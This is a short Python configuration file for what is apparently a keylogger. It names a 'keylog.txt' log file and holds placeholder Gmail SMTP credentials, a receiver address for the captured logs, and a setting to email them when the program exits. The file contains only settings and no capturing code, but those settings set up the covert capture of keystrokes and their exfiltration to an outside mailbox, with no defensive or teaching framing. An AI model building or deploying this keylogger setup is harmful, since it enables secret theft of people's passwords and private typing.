# config.py

import os

# === Log Settings ===
LOG_DIR = "logs"
LOG_FILE_NAME = "keylog.txt"
LOG_FILE_PATH = os.path.join(LOG_DIR, LOG_FILE_NAME)

# === Encryption Settings ===
ENCRYPT_LOGS = False  # Set to True to enable log encryption

# === Email Settings ===
EMAIL_SENDER = "your_email@gmail.com"           # Sender's email address
EMAIL_PASSWORD = "your_app_password"            # Use an App Password if using Gmail
EMAIL_RECEIVER = "receiver_email@example.com"   # Where logs should be sent

# === SMTP Server Settings ===
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 465  # SSL port for Gmail

# === Optional Settings ===
SEND_EMAIL_ON_EXIT = True  # Whether to send logs via email when exiting
